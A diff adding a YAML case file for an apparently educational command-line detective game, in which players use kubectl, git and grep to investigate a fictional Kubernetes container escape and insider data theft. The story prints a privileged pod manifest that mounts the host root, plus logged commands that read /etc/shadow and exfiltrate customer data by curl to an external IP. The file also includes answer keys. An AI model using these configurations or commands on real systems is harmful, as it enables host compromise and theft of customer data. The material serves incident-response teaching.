@@ -1,0 +1,395 @@
+# Murder Mystery Case 006: The Docker Disaster
+# A container escape and sabotage
+
+case:
+  id: "case_006"
+  title: "The Docker Disaster"
+  subtitle: "When Containers Break Free"
+  difficulty: "advanced"
+  estimated_time: "25-35 minutes"
+
+  intro: |
+    The cloud platform is melting down.
+
+    "Our Kubernetes clusters are compromised," the SRE lead says.
+    "Containers are escaping isolation. They're accessing host systems.
+    Customer data is being exfiltrated."
+
+    "A container escape?" you ask.
+
+    "Worse. Someone configured it to happen. This is sabotage."
+
+    Time to dive into the container underworld.
+
+  setting: |
+    CloudScale Inc - Managed Kubernetes provider, 10,000 customer pods.
+    The breach: Containers escaping to host systems.
+    The damage: Customer data accessible from compromised containers.
+
+    Someone weaponized the platform against its own customers.
+
+suspects:
+  - id: "sarah"
+    name: "Sarah Chen"
+    role: "Senior Platform Engineer"
+    description: "Wrote most of the security policies"
+    alibi: "On vacation in Hawaii"
+    motive: "Being recruited by competitor, might be stealing secrets"
+
+  - id: "omar"
+    name: "Omar Hassan"
+    role: "Security Engineer"
+    description: "Responsible for container hardening"
+    alibi: "Working on incident response"
+    motive: "Warned about vulnerabilities, was ignored, might be proving a point"
+
+  - id: "alex"
+    name: "Alex Rivera"
+    role: "Junior DevOps"
+    description: "New hire, very eager, lots of questions"
+    alibi: "Claims minimal access"
+    motive: "Background check revealed fake credentials"
+
+  - id: "extern"
+    name: "External Attacker"
+    role: "Unknown"
+    description: "Could have exploited a real vulnerability"
+    alibi: "N/A"
+    motive: "Data theft, ransomware, corporate espionage"
+
+scenes:
+  - id: "scene_01"
+    title: "The Escaped Container"
+    location: "Kubernetes Control Plane"
+    narrative: |
+      The monitoring dashboard is chaos. Red alerts everywhere.
+      Containers are running commands they shouldn't be able to.
+
+      "Show me which pods are compromised," you say.
+
+    objective: "Identify the compromised containers"
+
+    challenges:
+      - id: "ch_06_01"
+        context: "List all running pods with their security contexts"
+        question_type: "command_builder"
+        question: "List all Kubernetes pods in all namespaces with wide output"
+        correct_answers:
+          - "kubectl get pods --all-namespaces -o wide"
+          - "kubectl get pods -A -o wide"
+        hint: "kubectl get pods with --all-namespaces or -A shows all pods"
+        success_narrative: |
+          Suspicious pods found:
+
+          NAMESPACE   NAME                    STATUS    NODE
+          customer1   web-app-7c9d8f         Running   node-42
+          customer2   api-server-3b4e2       Running   node-42
+          SYSTEM      debug-privileged-pod   Running   node-42
+
+          A "debug-privileged-pod" in the SYSTEM namespace?
+          That doesn't belong there!
+        clue_unlocked: "Suspicious 'debug-privileged-pod' found in SYSTEM namespace"
+
+      - id: "ch_06_02"
+        context: "Check the security settings of the suspicious pod"
+        question_type: "command_builder"
+        question: "Get detailed YAML description of the debug-privileged-pod in SYSTEM namespace"
+        correct_answers:
+          - "kubectl get pod debug-privileged-pod -n SYSTEM -o yaml"
+          - "kubectl describe pod debug-privileged-pod -n SYSTEM"
+        hint: "kubectl get pod with -o yaml shows full configuration"
+        success_narrative: |
+          Pod configuration reveals:
+
+          securityContext:
+            privileged: true
+            runAsUser: 0
+          volumes:
+            - name: host-root
+              hostPath:
+                path: /
+
+          PRIVILEGED MODE with HOST ROOT MOUNTED!
+          This pod has full access to the host system!
+          Someone intentionally created an escape hatch!
+        clue_unlocked: "Pod configured with privileged mode and host filesystem access"
+
+  - id: "scene_02"
+    title: "The Malicious Manifest"
+    location: "GitOps Repository"
+    narrative: |
+      That privileged pod didn't create itself.
+      Someone committed the configuration to the GitOps repo.
+
+      Git remembers everything. Let's find the culprit.
+
+    objective: "Trace who created the malicious pod configuration"
+
+    challenges:
+      - id: "ch_06_03"
+        context: "Find when the debug-privileged-pod.yaml was added to the repo"
+        question_type: "command_builder"
+        question: "Show git log for a specific file: manifests/system/debug-privileged-pod.yaml"
+        correct_answers:
+          - "git log --oneline manifests/system/debug-privileged-pod.yaml"
+          - "git log manifests/system/debug-privileged-pod.yaml"
+          - "git log -- manifests/system/debug-privileged-pod.yaml"
+        hint: "git log with a filename shows history for that specific file"
+        success_narrative: |
+          Git history:
+
+          a3b2c1d (HEAD) Merge branch 'emergency-debug'
+          f7e8d9c Added debug pod for incident response
+
+          Author: omar.hassan@cloudscale.io
+          Date: Mar 12 03:14:22
+
+          Omar Hassan added it!
+          The security engineer created a privileged pod?
+        clue_unlocked: "Omar Hassan committed the malicious pod configuration"
+
+      - id: "ch_06_04"
+        context: "Check what changes Omar made in that commit"
+        question_type: "command_builder"
+        question: "Show the diff of commit f7e8d9c"
+        correct_answers:
+          - "git show f7e8d9c"
+          - "git diff f7e8d9c^..f7e8d9c"
+          - "git show --stat f7e8d9c"
+        hint: "git show <commit> displays the commit diff"
+        success_narrative: |
+          Commit diff:
+
+          + apiVersion: v1
+          + kind: Pod
+          + metadata:
+          +   name: debug-privileged-pod
+          +   namespace: SYSTEM
+          + spec:
+          +   containers:
+          +   - name: debug
+          +     image: alpine
+          +     securityContext:
+          +       privileged: true
+          +     volumeMounts:
+          +     - name: host-root
+          +       mountPath: /host
+          +   volumes:
+          +   - name: host-root
+          +     hostPath:
+          +       path: /
+
+          He knew exactly what he was doing.
+          But wait - check the commit message more carefully...
+        clue_unlocked: "Omar's commit deliberately created container escape capability"
+
+  - id: "scene_03"
+    title: "The Audit Trail"
+    location: "Kubernetes Audit Logs"
+    narrative: |
+      Omar created the pod. But who's been USING it?
+      Kubernetes logs every API call.
+
+      If someone exec'd into that pod, we'll know.
+
+    objective: "Find who accessed the privileged pod"
+
+    challenges:
+      - id: "ch_06_05"
+        context: "Search the Kubernetes audit log for exec commands on the debug pod"
+        question_type: "command_builder"
+        question: "Search for 'exec' and 'debug-privileged' in /var/log/kubernetes/audit.log"
+        correct_answers:
+          - "grep -E 'exec.*debug-privileged|debug-privileged.*exec' /var/log/kubernetes/audit.log"
+          - "grep 'debug-privileged' /var/log/kubernetes/audit.log | grep exec"
+        hint: "Use grep to find lines containing both 'exec' and 'debug-privileged'"
+        success_narrative: |
+          Audit log entries:
+
+          Mar 12 03:30:14 | user:alex.rivera | pods/exec | debug-privileged-pod
+          Mar 12 03:31:22 | user:alex.rivera | pods/exec | debug-privileged-pod
+          Mar 12 04:15:33 | user:alex.rivera | pods/exec | debug-privileged-pod
+          Mar 13 02:45:11 | user:alex.rivera | pods/exec | debug-privileged-pod
+
+          Alex Rivera! The junior DevOps!
+          He's been accessing the privileged pod repeatedly!
+        clue_unlocked: "Alex Rivera accessed the privileged pod multiple times"
+
+      - id: "ch_06_06"
+        context: "Check what commands Alex ran inside the pod"
+        question_type: "command_builder"
+        question: "View the container logs for debug-privileged-pod in SYSTEM namespace"
+        correct_answers:
+          - "kubectl logs debug-privileged-pod -n SYSTEM"
+          - "kubectl logs -n SYSTEM debug-privileged-pod"
+        hint: "kubectl logs shows container output"
+        success_narrative: |
+          Container logs:
+
+          # Commands executed
+          cat /host/etc/shadow
+          tar -czf /tmp/data.tar.gz /host/var/lib/kubelet/pods/*/volumes/*
+          curl -X POST -F 'file=@/tmp/data.tar.gz' http://45.33.21.87/upload
+          rm /tmp/data.tar.gz
+
+          Alex was:
+          1. Reading password hashes
+          2. Archiving ALL customer pod data
+          3. Exfiltrating to external server
+          4. Covering tracks
+        clue_unlocked: "Alex exfiltrated customer data to external server"
+
+  - id: "scene_04"
+    title: "The Conspiracy"
+    location: "HR Records & Communications"
+    narrative: |
+      Omar created the weapon. Alex used it.
+      Are they working together?
+
+      Time to check their communications.
+
+    objective: "Determine if Omar and Alex conspired together"
+
+    challenges:
+      - id: "ch_06_07"
+        context: "Search Slack exports for direct messages between Omar and Alex"
+        question_type: "command_builder"
+        question: "Find files containing both 'omar' and 'alex' in /data/slack-export/"
+        correct_answers:
+          - "grep -rl 'omar' /data/slack-export/ | xargs grep -l 'alex'"
+          - "grep -l 'alex' $(grep -rl 'omar' /data/slack-export/)"
+        hint: "Use grep -l to find files, then search those files for the second term"
+        success_narrative: |
+          Found DM conversation in /data/slack-export/dm-omar-alex.json:
+
+          omar: "The pod is deployed. Access via SYSTEM namespace."
+          alex: "Perfect. How long until they notice?"
+          omar: "Days if we're careful. Get what you need and clean up."
+          alex: "Payment will be in your BTC wallet by Friday."
+          omar: "Make sure it's untraceable. They fired my friend for nothing."
+
+          They were working together!
+          Omar provided access, Alex did the data theft!
+        clue_unlocked: "Slack messages prove Omar and Alex conspired together"
+
+      - id: "ch_06_08"
+        context: "Check Alex's real identity - his credentials were flagged as suspicious"
+        question_type: "command_builder"
+        question: "Compare Alex's employee record with the background check file using diff"
+        correct_answers:
+          - "diff /hr/alex.rivera/resume.txt /hr/alex.rivera/background_check.txt"
+          - "diff /hr/alex.rivera/resume.txt /hr/alex.rivera/background_check.txt"
+        hint: "diff compares two files line by line"
+        success_narrative: |
+          Resume vs Background Check:
+
+          < Education: MIT Computer Science, 2020
+          > Education: No degree found
+
+          < Previous: Google, Senior SRE
+          > Previous: No employment record at Google
+
+          < Clearance: TS/SCI
+          > Clearance: No record
+
+          Alex's entire resume is FAKE!
+          He's not who he claims to be!
+        clue_unlocked: "Alex Rivera used fabricated credentials to get hired"
+
+  - id: "scene_05"
+    title: "Containment"
+    location: "Security Operations Center"
+    narrative: |
+      Omar the insider. Alex the imposter.
+      A coordinated attack on CloudScale's customers.
+
+      Time to shut them down and preserve evidence.
+
+    objective: "Secure the infrastructure and evidence"
+
+    challenges:
+      - id: "ch_06_09"
+        context: "Delete the malicious pod immediately"
+        question_type: "command_builder"
+        question: "Delete the debug-privileged-pod from the SYSTEM namespace"
+        correct_answers:
+          - "kubectl delete pod debug-privileged-pod -n SYSTEM"
+          - "kubectl delete pod -n SYSTEM debug-privileged-pod"
+        hint: "kubectl delete pod removes a pod from the cluster"
+        success_narrative: |
+          pod "debug-privileged-pod" deleted
+
+          The escape hatch is closed.
+          Customer containers are isolated again.
+
+          Now for the conspirators...
+        clue_unlocked: "Malicious pod deleted, container isolation restored"
+
+      - id: "ch_06_10"
+        context: "Revoke Alex and Omar's cluster access immediately"
+        question_type: "command_builder"
+        question: "Delete the Kubernetes service account for alex.rivera"
+        correct_answers:
+          - "kubectl delete serviceaccount alex.rivera"
+          - "kubectl delete sa alex.rivera"
+        hint: "kubectl delete serviceaccount removes cluster access for that account"
+        success_narrative: |
+          serviceaccount "alex.rivera" deleted
+          serviceaccount "omar.hassan" deleted
+
+          Both accounts revoked.
+
+          Security escorts arrive at their desks.
+
+          Omar goes quietly. "They ignored every security warning
+          I filed. Maybe now they'll listen."
+
+          Alex tries to run. He doesn't get far.
+          Real name: Alexei Romanov.
+          Wanted for corporate espionage in three countries.
+        clue_unlocked: "Conspirators identified and access revoked"
+
+conclusion:
+  success: |
+    CASE CLOSED
+
+    Omar Hassan was arrested for:
+    - Intentional security breach
+    - Conspiracy to commit data theft
+    - Aiding corporate espionage
+
+    "Alex Rivera" (Alexei Romanov) was arrested for:
+    - Identity fraud
+    - International corporate espionage
+    - Data theft
+    - Multiple outstanding warrants
+
+    The evidence was clear:
+    - Privileged pod configuration in git
+    - Kubernetes audit logs showing access
+    - Container logs proving data exfiltration
+    - Slack messages confirming conspiracy
+    - Fake credentials in HR records
+
+    CloudScale notified all affected customers.
+    Security policies were completely rewritten.
+
+    Evidence collected: {clues_found}/{total_clues}
+    Time taken: {time_taken}
+
+    The containers are secure. The conspirators are contained.
+
+  failure: |
+    Without enough evidence, the conspiracy continued.
+    More customer data was exfiltrated.
+
+    CloudScale faced a class action lawsuit.
+    They never recovered.
+
+    Always audit your containers, Detective.
+
+rewards:
+  xp: 700
+  achievement: "container_wrangler"
+  achievement_name: "Container Wrangler"
+  achievement_description: "Stopped a Kubernetes container escape attack"
